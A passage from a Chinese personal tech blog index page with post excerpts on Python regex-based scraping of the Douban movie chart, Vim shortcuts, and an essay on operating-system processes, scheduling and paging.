f.write(response.content)</span><br></pre></td></tr></table></figure>

<h1 id="解析网页"><a href="#解析网页" class="headerlink" title="解析网页"></a>解析网页</h1><p>解析网页一般用到的库有<code>BeautifulSoup,PyQuery,re</code>，BeautifulSoup又称之为bs4，要区别于之前的bs3。bs4和PyQuery类似，都是通过网页的节点(&lt;div&gt; …&lt;/div&gt; 这样的东西称之为结点)来定位内容的。</p>
<p>而re是直接匹配内容，更加灵活。下面是re匹配表，虽然多，但通常我们只需要用到 <code>. * ?</code>这三个符号。</p>
<p>re正则表达式，正则就是用一些具有特殊含义的符号组合到一起（称为正则表达式）来描述字符或者字符串的方法。或者说：正则就是用来描述一类事物的规则。（在Python中）它内嵌在Python中，并通过 re 模块实现。正则表达式模式被编译成一系列的字节码，然后由用 C 编写的匹配引擎执行。</p>
<table>
<thead>
<tr>
<th align="left">元字符</th>
<th align="left">匹配内容</th>
</tr>
</thead>
<tbody><tr>
<td align="left">\w</td>
<td align="left">匹配字母（包含中文）或数字或下划线</td>
</tr>
<tr>
<td align="left">\W</td>
<td align="left">匹配非字母（包含中文）或数字或下划线</td>
</tr>
<tr>
<td align="left">\s</td>
<td align="left">匹配任意的空白符</td>
</tr>
<tr>
<td align="left">\S</td>
<td align="left">匹配任意非空白符</td>
</tr>
<tr>
<td align="left">\d</td>
<td align="left">匹配数字</td>
</tr>
<tr>
<td align="left">\D</td>
<td align="left">匹配非数字</td>
</tr>
<tr>
<td align="left">\A</td>
<td align="left">从字符串开头匹配</td>
</tr>
<tr>
<td align="left">\z</td>
<td align="left">匹配字符串的结束，如果是换行，只匹配到换行前的结果</td>
</tr>
<tr>
<td align="left">\n</td>
<td align="left">匹配一个换行符</td>
</tr>
<tr>
<td align="left">\t</td>
<td align="left">匹配一个制表符</td>
</tr>
<tr>
<td align="left">^</td>
<td align="left">匹配字符串的开始</td>
</tr>
<tr>
<td align="left">$</td>
<td align="left">匹配字符串的结尾</td>
</tr>
<tr>
<td align="left">.</td>
<td align="left">匹配任意字符，除了换行符，当re.DOTALL标记被指定时，则可以匹配包括换行符的任意字符。</td>
</tr>
<tr>
<td align="left">[…]</td>
<td align="left">匹配字符组中的字符</td>
</tr>
<tr>
<td align="left">[^…]</td>
<td align="left">匹配除了字符组中的字符的所有字符</td>
</tr>
<tr>
<td align="left">*</td>
<td align="left">匹配0个或者多个左边的字符。</td>
</tr>
<tr>
<td align="left">+</td>
<td align="left">匹配一个或者多个左边的字符。</td>
</tr>
<tr>
<td align="left">？</td>
<td align="left">匹配0个或者1个左边的字符，非贪婪方式。</td>
</tr>
<tr>
<td align="left">{n}</td>
<td align="left">精准匹配n个前面的表达式。</td>
</tr>
<tr>
<td align="left">{n,m}</td>
<td align="left">匹配n到m次由前面的正则表达式定义的片段，贪婪方式</td>
</tr>
<tr>
<td align="left">()</td>
<td align="left">匹配括号内的表达式，也表示一个组</td>
</tr>
<tr>
<td align="left">[:alnum:]</td>
<td align="left">字母和数字</td>
</tr>
<tr>
<td align="left">[:alpha:]</td>
<td align="left">字母</td>
</tr>
<tr>
<td align="left">[:ascii:]</td>
<td align="left">ascii字符</td>
</tr>
<tr>
<td align="left">[:blank:]</td>
<td align="left">空白字符</td>
</tr>
<tr>
<td align="left">[:cntrl:]</td>
<td align="left">控制字符包括换行符、换页符、退格符</td>
</tr>
<tr>
<td align="left">[:digit:]</td>
<td align="left">数字</td>
</tr>
<tr>
<td align="left">[:graph:]</td>
<td align="left">非控制、非空格字符</td>
</tr>
<tr>
<td align="left">[:lower:]</td>
<td align="left">小写字母</td>
</tr>
<tr>
<td align="left">[:print:]</td>
<td align="left">可打印字符</td>
</tr>
<tr>
<td align="left">[:punct:]</td>
<td align="left">标点符号字符</td>
</tr>
<tr>
<td align="left">[:space:]</td>
<td align="left">空白字符</td>
</tr>
<tr>
<td align="left">[:upper:]</td>
<td align="left">大写字母</td>
</tr>
<tr>
<td align="left">[:xdigit:]</td>
<td align="left">十六进制数字</td>
</tr>
<tr>
<td align="left">^$</td>
<td align="left">匹配空行</td>
</tr>
<tr>
<td align="left">&lt;</td>
<td align="left">词首</td>
</tr>
<tr>
<td align="left">&gt;</td>
<td align="left">词尾</td>
</tr>
<tr>
<td align="left">&lt;pattern&gt;</td>
<td align="left">整个单词</td>
</tr>
</tbody></table>
<hr>
<p>重点</p>
<table>
<thead>
<tr>
<th>字符</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>？</td>
<td>匹配0个或者1个左边的字符，非贪婪方式。</td>
</tr>
<tr>
<td>.</td>
<td>匹配任意字符，除了换行符。</td>
</tr>
<tr>
<td>*</td>
<td>匹配*号前的字符0次或多次。</td>
</tr>
</tbody></table>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.*? 的含义就是 非贪婪匹配前面任意字符</span><br></pre></td></tr></table></figure>

<p>通常采用的组合</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#re.complie写re表达式</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">如果不使用re.S参数，则只在每一行内进行匹配，如果一行没有，就换下一行重新开始。</span></span><br><span class="line"><span class="string">而使用re.S参数以后，正则表达式会将这个字符串作为一个整体，在整体中进行匹配。</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">parent = re.compile(<span class="string">'&lt;div.*?页数:.*?&lt;/span&gt;(.*?)&lt;br/&gt;'</span>, re.S)</span><br><span class="line"></span><br><span class="line"><span class="comment">#re.findall查找html的内容并和parent匹配，返回一个列表。</span></span><br><span class="line">result = re.findall(page_parent, html)</span><br></pre></td></tr></table></figure>

<h1 id="项目实战"><a href="#项目实战" class="headerlink" title="项目实战"></a>项目实战</h1><p>爬取豆瓣电影榜。这个会用到我们之前在<code>发起请求 -- 添加请求头</code>中写的内容，这里主要关注re解析的过程。</p>
<p>首选选中一个item，观察它在源码的什么位置，然后折叠源码。</p>
<p><img src="https://i.loli.net/2019/10/21/bw659mYLhFJRyxr.png" alt="一个item"></p>
<br>
折叠源码后，可以看到选中的这些都十分相似，判断一下可知，他们就是每一部电影的html源码。这样就得到了电影榜单的一般格式。

<p><img src="https://i.loli.net/2019/10/21/ZNOmvfTBdMAj3a5.png" alt="item列表"></p>
<br>
依次选取关键字，用来生成re表达式。我们选中了`table width,class="item" class="nbg" title`这些关键字。

<p><img src="https://i.loli.net/2019/10/21/BzO7qV8NYpbWUg4.png" alt="image.png"></p>
<p>所以，re表达式是：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#用括号选出你需要的内容</span></span><br><span class="line">pattern = re.compile(<span class="string">'table.*?class="item".*?nbg.*?title="(.*?)"'</span>,re.S)</span><br></pre></td></tr></table></figure>

<p>选中的有些内容其实并不必要，我们就将它去除掉了。具体代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url = <span class="string">'https://movie.douban.com/chart'</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#请求request</span></span><br><span class="line">response = requests.get(url,headers=headers)</span><br><span class="line">html = response.text</span><br><span class="line"></span><br><span class="line"><span class="comment">#解析</span></span><br><span class="line">pattern = re.compile(<span class="string">'table.*?class="item".*?nbg.*?title="(.*?)"'</span>,re.S)</span><br><span class="line">result = re.findall(pattern,html)</span><br><span class="line"></span><br><span class="line"><span class="comment">#打印</span></span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<p><img src="https://i.loli.net/2019/10/21/ErF297sh5xbgpqk.png" alt="爬虫效果"></p>
<p>如果想要输出更美观，还可以添加一些字段处理等：<br><br></p>
<p><img src="https://i.loli.net/2019/10/21/9FnVA4Yy61NdpZM.png" alt="美化效果"></p>

            
            <p class="more">
                <a href="../../http:/ymlog.cn/2019/10/21/Python%E7%88%AC%E8%99%AB%E5%A4%A7%E7%BA%B2%E6%A6%82%E8%BF%B0/">阅读剩下更多</a>
            </p>
        </div>
        <div class="post-thumbnail" data-img="">
            <a href="http://ymlog.cn/2019/10/21/Python%E7%88%AC%E8%99%AB%E5%A4%A7%E7%BA%B2%E6%A6%82%E8%BF%B0/" title="Python爬虫大纲概述">
                
                    <img class="thumbnail" src="../../img/default.png" data-echo="../../img/thumbnail/1.jpg" alt="默认配图" >
                
            </a>
        </div>
    </div>
</article>

    
        <!-- 文章列表 item -->
<article class="post">
    <header>
        <!-- 标签这有且只能显示一个 -->
        
        <a class="cat-link" href="../../categories/Linux/">Linux</a>
        
        <!-- 文章标题 -->
        
    <h3 class="post-title">
    	<a href="../../http:/ymlog.cn/2019/10/20/%E5%8D%9A%E5%AE%A2%E5%8E%86%E5%8F%B2/">
    		博客历史
    	</a>
    </h3>

    </header>
    <p class="post-meta">
        Jelon 发表于
        <time datetime="2019-10-20T13:58:02.000Z">2019-10-20</time>
        &nbsp;&nbsp;
        <span class="post-tags">
            标签：
            
        </span>
    </p>

    <div class="post-content">
        <div class="post-excerpt">
            
                <p>岁月悲华发，流光爱少年。</p>
            
            <p class="more">
                <a href="../../http:/ymlog.cn/2019/10/20/%E5%8D%9A%E5%AE%A2%E5%8E%86%E5%8F%B2/">阅读剩下更多</a>
            </p>
        </div>
        <div class="post-thumbnail" data-img="">
            <a href="http://ymlog.cn/2019/10/20/%E5%8D%9A%E5%AE%A2%E5%8E%86%E5%8F%B2/" title="博客历史">
                
                    <img class="thumbnail" src="../../img/default.png" data-echo="../../img/thumbnail/0.jpg" alt="默认配图" >
                
            </a>
        </div>
    </div>
</article>

    
        <!-- 文章列表 item -->
<article class="post">
    <header>
        <!-- 标签这有且只能显示一个 -->
        
            <a href="javascript: void(0);" class="cat">未分类</a>
        
        <!-- 文章标题 -->
        
    <h3 class="post-title">
    	<a href="../../http:/ymlog.cn/2019/10/10/Vim%E5%BF%AB%E6%8D%B7%E9%94%AE/">
    		Vim快捷键
    	</a>
    </h3>

    </header>
    <p class="post-meta">
        Jelon 发表于
        <time datetime="2019-10-10T13:13:51.000Z">2019-10-10</time>
        &nbsp;&nbsp;
        <span class="post-tags">
            标签：
            
    
        <a href="../../tags/%E5%BF%AB%E6%8D%B7%E9%94%AE/" title="快捷键">快捷键</a>
    

        </span>
    </p>

    <div class="post-content">
        <div class="post-excerpt">
            
                <h1 id=""><a href="#" class="headerlink" title=""></a></h1><ul>
<li>j：向下滚动一点</li>
<li>k：向上滚动一点</li>
<li>gg：到页面最底部</li>
<li>G：到页面最底部</li>
<li>d：向下翻一屏</li>
<li>u：向上翻一屏</li>
</ul>
<p>常用命令</p>
<h1 id="1、批量加注释"><a href="#1、批量加注释" class="headerlink" title="1、批量加注释"></a>1、批量加注释</h1><pre><code>ctrl + v，进入可视块模式
移动光标，选中的位置会有高亮显示
shift + i，进入 insert 模式
输入//
esc</code></pre><h1 id="2、批量解注释"><a href="#2、批量解注释" class="headerlink" title="2、批量解注释"></a>2、批量解注释</h1><pre><code>解注释
光标置于行首
ctrl + v，进入可视块模式
移动光标，选中的位置会有高亮显示
按d</code></pre><h1 id="3、删除"><a href="#3、删除" class="headerlink" title="3、删除"></a>3、删除</h1><pre><code>命令行模式：:%d 删除所有内容
末行模式：dG：删除光标下所有内容
dw：删除一个单词</code></pre><h1 id="4、移动"><a href="#4、移动" class="headerlink" title="4、移动"></a>4、移动</h1><pre><code>gg：光标移到第一行
G：光标移到最后一行
9k  向上移动9次，同理num hjkl</code></pre><h1 id="5、退出"><a href="#5、退出" class="headerlink" title="5、退出"></a>5、退出</h1><pre><code>ZZ 保存并退出，行末模式</code></pre><h1 id="6、括号跳转"><a href="#6、括号跳转" class="headerlink" title="6、括号跳转"></a>6、括号跳转</h1><pre><code>%</code></pre><h1 id="7、滚屏"><a href="#7、滚屏" class="headerlink" title="7、滚屏"></a>7、滚屏</h1>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CTRL-U：窗口向上滚动半屏</span><br><span class="line">CTRL-D：窗口向下滚动半屏</span><br><span class="line">CTRL-F：窗口向下滚动全屏</span><br><span class="line">CTRL-B：窗口向上滚动全屏</span><br><span class="line">zz    ：窗口正中</span><br><span class="line">zt    ：将最下面的窗口调到最上面</span><br><span class="line">zb    ：将最上面的窗口调到最下面</span><br></pre></td></tr></table></figure>



<h1 id="8、查找"><a href="#8、查找" class="headerlink" title="8、查找"></a>8、查找</h1><pre><code>/string
#查找后
‘#’ ：往上查找
‘*’：往下查找
/the\&gt; 精确查找，确保以&apos;the&apos;结尾。&apos;\&lt;&apos;:开头，&apos;\&gt;&apos;：结尾</code></pre><h1 id="9、多屏编辑"><a href="#9、多屏编辑" class="headerlink" title="9、多屏编辑"></a>9、多屏编辑</h1><pre><code>vim a.sh b.sh -O #垂直

Ctrl+w：跳转
qall!:前置退出所有</code></pre><h1 id="10、替换"><a href="#10、替换" class="headerlink" title="10、替换"></a>10、替换</h1><pre><code>s/{word1}/{word2}/g : 将光标所在行的所有word1替换为word2
%s/{word1}/{word2}/g : 将所有word1替换为word2
g表示全局替换
i表示大小写不敏感，I表示大小写敏感
如：
    %s/sudo/su/ig</code></pre><h1 id="行末模式"><a href="#行末模式" class="headerlink" title="行末模式"></a>行末模式</h1><pre><code>a    光标所在下一个位置插入
A    光标所在行末尾插入
i    光标所在位置插入
I    光标所在行首插入
o    光标所在下一行插入
O    光标所在上一行插入

y   复制
p   粘贴
dd  删除一行
u   撤销</code></pre><h1 id="命令模式"><a href="#命令模式" class="headerlink" title="命令模式"></a>命令模式</h1><pre><code>#设置行号
set nu   
#取消行号                  
set nonu 
#下划线              
set cursorline     
#Tab=2个空格
set ts=2
#忽略大小写
set ignorecase
#不忽略大小写
set noignorecase</code></pre><h1 id="输入模式"><a href="#输入模式" class="headerlink" title="输入模式"></a>输入模式</h1><h1 id="定制vim"><a href="#定制vim" class="headerlink" title="定制vim"></a>定制vim</h1><blockquote>
<p>配置文件：全局有效<br>全局：/etc/vimrc<br>个人：~/.vimrc<br>行末：对当前进程有效</p>
</blockquote>
<p>相关配置</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">行号：</span><br><span class="line">  显示：<span class="built_in">set</span> nu</span><br><span class="line">  取消：<span class="built_in">set</span> nonu</span><br><span class="line">括号匹配：</span><br><span class="line">  匹配：<span class="built_in">set</span> showmatch</span><br><span class="line">  取消：<span class="built_in">set</span> unshowmatch</span><br><span class="line">自动缩进：</span><br><span class="line">  启动  <span class="built_in">set</span> ai</span><br><span class="line">  取消：  <span class="built_in">set</span> noai</span><br><span class="line">高亮搜索：</span><br><span class="line">  启动 <span class="built_in">set</span> hlsearch</span><br><span class="line">  取消 <span class="built_in">set</span> nohlsearch</span><br><span class="line">语法高亮</span><br><span class="line">  启动 syntax on</span><br><span class="line">  取消 syntax off</span><br><span class="line">忽略大小写</span><br><span class="line">  启动 <span class="built_in">set</span> ic</span><br><span class="line">  取消 <span class="built_in">set</span> noic</span><br><span class="line">获取帮助：</span><br><span class="line">  <span class="built_in">help</span></span><br></pre></td></tr></table></figure>

            
            <p class="more">
                <a href="../../http:/ymlog.cn/2019/10/10/Vim%E5%BF%AB%E6%8D%B7%E9%94%AE/">阅读剩下更多</a>
            </p>
        </div>
        <div class="post-thumbnail" data-img="">
            <a href="http://ymlog.cn/2019/10/10/Vim%E5%BF%AB%E6%8D%B7%E9%94%AE/" title="Vim快捷键">
                
                    <img class="thumbnail" src="../../img/default.png" data-echo="../../img/thumbnail/0.jpg" alt="默认配图" >
                
            </a>
        </div>
    </div>
</article>

    
        <!-- 文章列表 item -->
<article class="post">
    <header>
        <!-- 标签这有且只能显示一个 -->
        
        <a class="cat-link" href="../../categories/Linux/">Linux</a>
        
        <!-- 文章标题 -->
        
    <h3 class="post-title">
    	<a href="../../http:/ymlog.cn/2019/08/22/OS%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/">
    		OS操作系统
    	</a>
    </h3>

    </header>
    <p class="post-meta">
        Jelon 发表于
        <time datetime="2019-08-22T06:45:18.000Z">2019-08-22</time>
        &nbsp;&nbsp;
        <span class="post-tags">
            标签：
            
        </span>
    </p>

    <div class="post-content">
        <div class="post-excerpt">
            
                <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Operation System 是系统资源的管理者，在有限的资源内，通过算法，完成相对合理的分配。在复杂的硬件环境中，通过封装，完成动作指令的抽象化。这一切的基石，则是密集的数据结构和算法。</p>
<p>相对合理体现在：</p>
<ul>
<li>调度算法实现的低用户响应时间和紧急事件处理</li>
<li>虚拟技术实现多用户登录</li>
<li>IO设备控制器尽可能减少CPU调度</li>
<li>文件目录系统屏蔽了数据写入物理块的底层细节</li>
<li>命令接口、图形接口的封装</li>
</ul>
<h2 id="相关概念"><a href="#相关概念" class="headerlink" title="相关概念"></a>相关概念</h2><ul>
<li>并发：在多台处理器上同时处理多个任务</li>
<li>并行：在一台处理器上宏观上同时处理多个任务，微观上一个时间段只处理一个任务</li>
<li>并发进程的制约关系：同步和互斥</li>
<li>同步：同步亦称直接制约关系，它是指为完成某种任务而建立的两个或多个进程，这些进程因为需要在某些位置上协调它们的工作次序而等待、传递信息所产生的制约关系。进程间的直接制约关系就是源于它们之间的相互合作。</li>
<li>互斥：互斥亦称间接制约关系。当一个进程进入临界区使用临界资源时，另一个进程必须等待, 当占用临界资源的进程退出临界区后，另一进程才允许去访问此临界资源。</li>
<li>异步：异步是进程之间彼此独立，在等待其他进程的运行时，本进程继续做自己的事，不需要等待其他进程完成后再工作。</li>
<li>临界资源：一次仅允许一个进程使用的资源</li>
<li>管程：管程在功能上和信号量及PV操作类似，属于一种进程同步互斥工具</li>
<li>符号链接：是文件共享的一种方式，允许一个文件或子目录有多个父目录，但其中仅有一个座位主父目录，但其他几个父目录都是通过符号链接方式与之相连。</li>
<li>索引结点实现文件共享：在文件目录中只设置文件名以及指向相应索引结点的指针，源文件删除后，会出现悬空指针。</li>
<li>工作集：是指在某段时间间隔 ∆ 里，进程实际要访问的页面的集合。</li>
<li>抖动：如果多道程度过高，页面在内存与外存之间频繁调度，以至于调度页面所需时间比进程实际运行的时间还多，此时系统效率急剧下降，甚至导致系统崩溃。这种现象称为颠簸或抖动(thrashing)</li>
</ul>
<h2 id="相关技术"><a href="#相关技术" class="headerlink" title="相关技术"></a>相关技术</h2><ul>
<li>虚拟技术</li>
<li>复用技术</li>
<li>中断技术</li>
<li>封装技术</li>
</ul>
<h2 id="相关算法"><a href="#相关算法" class="headerlink" title="相关算法"></a>相关算法</h2><ul>
<li>双标志后检查法</li>
<li>记录型信号量机制</li>
<li>先来先服务算法(First Come First Serve)</li>
<li>短作业优先(Shortest Job First)</li>
<li>高响应比优先(Highest Response Ratio Next)</li>
<li>时间片轮转调度(Round Robin)</li>
<li>优先级调度算法</li>
<li>多级反馈调度算法</li>
</ul>
<br>

<hr>
<br>

<h2 id="一个进程从被创建到终止，其中不得不说的故事"><a href="#一个进程从被创建到终止，其中不得不说的故事" class="headerlink" title="一个进程从被创建到终止，其中不得不说的故事"></a>一个进程从被创建到终止，其中不得不说的故事</h2><p>&emsp;&emsp; 当我们打开一个程序。这个程序就会被执行。因为CPU速度非常快，普通硬盘的读写速度跟不上CPU的速度，所以我们会把程序调入内存中执行，这样就产生了进程。</p>
<p>&emsp;&emsp; 如果我们同时打开多个应用，就会产生多个进程，在宏观上每一个进程在CPU内同时执行(并发)，微观上每个进程在CPU内交替执行，同一个处理机同一时间内只能执行一个进程(并行)。</p>
<p>&emsp;&emsp; 由于人们的需求不一样，希望有些应用执行的更快一点，就此产生了进程的优先级。但在处理机调度算法中，优先级只是决定一个进程能够被分到多少运行时间的指标之一，还有其他的指标，诸如：CPU利用率(CPU忙碌的时间 / 作业被处理所需要的总时间)，系统吞吐量(单位时间内完成作业的数量)，周转时间(作业从被提交给系统到最后完成所用时间)，响应时间(用户提出请求到首次响应所用的时间，简而言之，就是你点击一个应用，系统过了多个才给你打开)，这些也是衡量一个处理机调度算法优劣的指标。</p>
<p>&emsp;&emsp; 截止到现在，你还是只点了一下应用，电脑界面还什么都没有发生。当你点下鼠标的那一刻，该应用(下文全部用作业来代替)会被装入到内存，但是并不是全部被装入内存，比如打开英雄联盟，它只会将加载页面放入内存，而不会把对战地图放入内存，这样有一个好处就是，原本8G的League of Legends,现在只需要不到4G就可以带动了。</p>
<p>&emsp;&emsp;当一个作业被装入内存，会有模块链接的相关步骤，但现代操作系统一般采用运行时动态链接，即程序执行过程中需要改模块时，才对它进行链接。而在以前，则采用静态链接，即在程序运行之前，先将各个目标模块及它们所需的库函数连接成一个完整的可执行文件（装入模块），之后不再拆开。所以这一步不再是程序执行的第一步了，写到这，程序执行的第一步即将开始，那就是动态重定位装入。</p>
<p>&emsp;&emsp;装入就是将作业装入内存，其中涉及到很多东西，比如内存如何分配给作业、作业执行完之后如何回收内存、当作业太大时内存如何扩展等。先看最开始的——如何分配内存给作业。</p>
<p>&emsp;&emsp;现在操作系统一般采用离散分配的方式，就是将作业拆成很多块，同时将内存拆成很多块，按照非连续的方式，将作业放入内存。这样可以产生较少的空间碎片。一般的分配机制采取分页存储管理、分段存储管理或者段页存储管理。这时候，我们的LOL的一部分(可能是登录界面)，已经被拆成很多块，塞到内存页中了。下一步就是交给CPU执行了，但其实还缺少了一步——进程创建。我们一直在将它如何进入内存，却忘了给它创建进程，但现在也为时不晚。</p>
<p>&emsp;&emsp;进程创建首先要向操作系统申请空白的PCB(Process Control Block)，获得唯一标识符UID，然后是分配资源，毕竟进程是系统资源调度的最小单位，而线程则是处理机调度的最小单位。接着初始化PCB信息初始化处理机状态信息 ：使程序计时器指向程序的入口地址，使指针指向栈项，初始化处理机控制信息 ：设置进程状态为就绪或者静止就绪，优先级默认为最低。最后终于可以将进程插入就绪队列，只等处理机调度了。虽然程序已经做了这么多事，但现在用户还是什么也看不到，当用户第一次看到反应的时候，就是用户响应时间(前面提到过的处理机调度算法的指标)</p>
<p>&emsp;&emsp;这个时候可以谈一谈处理机如何调度进程的，这个就是进程切换。得益于优秀的数据结构，处理机实现进程切换只需要把PCB(进程控制模块)中的相关数据进行修改。比如一个进程从运行态切换为阻塞态，处理机会根据进程标识符UID，读取进程状态，将进程PCB中的状态信息修改从运行修改为阻塞，同时将运行环境信息存入该进程的PCB中，再把该进程移到阻塞队列队尾，选择下一个就绪队列的进程，读取其PCB中CPU的运行环境，然后恢复运行环境，开始执行这个进程，类似同时和多个人聊微信时的状态。这里会产生一个问题，进程并不是平等的，操作系统会希望一些进程执行的更快，一些则无所谓。这就像同时和多个人聊微信，对女朋友所化的时间总是会比其他人多，因为有一些人、或是进程的优先级总是高于其他。这就涉及到了处理机调度算法，这里只介绍两种算法。</p>
<p>&emsp;&emsp;处理机调度算法是为了更高的I/O，更快的响应时间，以及更多的CPU利用率等等。</p>
<ul>
<li>时间片轮转调度算法(Round Robin)</li>
</ul>
<p>&emsp;&emsp;这种算法把时间切片，比如在一分钟内有三个进程运行。处理机划分时间片为100ms，每隔100ms切换一次进程。</p>
<pre><code>000~100ms：执行进程A1
100~200ms：执行进程A2
200~300ms：执行进程A3
300~400ms：执行进程A1
400~500ms：执行进程A2
500~600ms：执行进程A3
........</code></pre><ul>
<li>多级反馈调度算法</li>
</ul>
<p>&emsp;&emsp;(说实话，写到这里我已经不想写了，为什么我们的程序还没执行)</p>
<p><img src="https://i.loli.net/2019/10/21/6CA9hEJvWGRFQzB.png" alt="多级反馈调度算法"></p>
<p>&emsp;&emsp;该算法划分了多个优先级就绪队列以及多种时间片大小，优先级越高，时间片越小。当一个进程产生时，先到优先级最高的就绪队列执行一个时间片，如果作业没有执行完，那么就进入下一个优先级次一级的队列，这时候进来的进程仍然送往第一优先级队列，执行一个时间片，然后送往第二优先级队列。如果此时没有进程，则执行第二优先级队列。如果作业还没有执行完，则放入第三优先级队列。</p>
<p>总结：</p>
<pre><code>1、设置多级就绪队列，各级队列优先级从高到低、时间片从小到大
2、新进程到达时，先进入一级队列，运行结束后进入下一级队列队尾，到了最下一级，就重新放回该队列队尾
3、只有第k级为空，才会为k+1级队列分配时间片</code></pre><p>优点：</p>
<pre><code>1、对各类进程相对公平（FCFS的优点）
2、每个进程到达都可以很快的得到响应（RR优点）
3、短进程只用较少的时间就可以完成（SPF优点）
4、不必实现估计进程的运行时间（避免用户作假）
5、灵活的调整对各类进程的偏好程度，I/O密集型进程（将因I/O阻塞的进程重新放回队列）</code></pre><p>&emsp;&emsp;我们的游戏此时还在就绪队列，可能就在多级反馈调度算法的第一个队列中。之后，该进程就会被安排上处理机执行。在执行的过程中还会发生一件事，比如你进入了游戏，需要加载地图界面，这时候，操作系统就会发生缺页中断，缺页中断就是要访问的页不在主存，需要操作系统将其调入主存后再进行访问。缺页中断、请求调页和页面置换是实现分页请求功能的三个步骤。</p>
<pre><code>请求分页也称为页式虚拟存储管理，是建立在基本分页基础上，为了能支持虚拟存储器功能而增加了请求调页功能和页面置换功能其基本思想是：在进程开始运行之前，不是装入全部页面，而是装入部分页面，之后根据进程运行的需要，动态装入其他页面，当内存空间已满，又需要装入新的页面时，根据某种算法淘汰某个页面，以便装进新的页面。</code></pre><p>&emsp;&emsp;实现请求分页，就需要解决两个问题——调出和调入。调出调哪里的页面？</p>
<p>调出</p>
<pre><code>现代操作系统一般采用可变分配全局置换，进程缺页时，只允许该进程在内存的页面中选择一页换出，这样就不会影响其他进程运行，如果该进程在运行过程中频繁的中断，系统再为该进程分配若干物理块。</code></pre><p>调入</p>
<pre><code>将请求分页系统的外存分为两步分，用于存放文件区和用于存放对换页面的对换区。通常，对换区采取连续分配的方式。如果系统有足够的空间，可以全部从对换区调入所需页面。如果系统缺少足够的对换区空间，这时，凡是不会被修改的文件，都直接从文件区调入；而当换出这些页面时，由于未被修改，所以不必再将他们换出。对于那些会被修改的文件，则将他们调出时，便调到对换区，需要时，再从对换区调入。</code></pre><p>页面调入的过程</p>
<pre><code>--程序所要访问的页面不在内存
--CPU发出缺页中断
--中断处理程序保留CPU环境，分析中断原因，转入中断处理
--查号页表，得到该页的外存地址
判断
IF {内存能容纳新页}:
    启动I/O,将所缺页调入，并修改页表
ELSE {内存满了}:
    按照某种置换算法，从内存中选取一页准备换出
判断    
    IF {准备换出的这一页没有被修改过}:
        不必写入磁盘
    ELSE {修改过}:
        则必须写入磁盘
--然后把所缺页调入内存，并修改页表中相应的值。</code></pre><p>&emsp;&emsp;以上实现了操作系统的虚拟化存储，以便于去执行那些内存大的程序。当操作系统产生了一个作业的执行结果，它会将执行的结果通过I/O设备传输给用户，简而言之就是屏幕。那么操作系统是如何通过屏幕让用户看到的呢？而且我们玩的过程中所敲的QWERDF是如何被操作系统识别的呢？这个就设计到了操作系统的IO管理。I/O管理系统可以让我们不用关心一个当我们敲下一个字符的时候，计算机是怎么接受、怎么处理以及怎么显示在我们希望它显示的位置，但学习计算机一定会了解I/O管理系统。</p>
<p>&emsp;&emsp;一般I/O设备是不会直接和CPU进行通信的，因为这样会大量占用CPU的资源，总不可能你在键盘上输入一个字符，就直接通过I/O设备进入到CPU中。为了提高CPU的利用率，I/O系统在I/O设备和CPU通信之间设置了中间件，这就是设备控制器</p>
<p><img src="https://i.loli.net/2020/01/17/PqIxotaAkcMnhiV.png" alt="Device_Control.png"></p>
<p>&emsp;&emsp;键盘鼠标等输入输出设备现将内容传输给设备控制器的缓冲区，缓冲区积累一定的量之后，由设备控制器向CPU发送一个中断指令，CPU保存其运行环境，然后和设备控制器进行通信。至此，你所敲下的信息被操作系统所认知。接下来就是CPU将接受到的信息进行处理，将最终结果返还给用户，下面是处理过程。</p>
<p>&emsp;&emsp;操作系统是一个庞大的进程合集，一个进程需要将自己的数据传输给其他进程，比如说当你在网页上复制一段下载链接时，后台的迅雷就会自动跳出来。这就是进程间通信，通俗一点就是进程间信息的传递。进程通信存在同步(同步和互斥)和异步两种方式。而进程间通信的具体实现主要是以下三种方式：</p>
<p>1、共享存储</p>
<pre><code>设置一个共享空间
互斥的访问共享空间
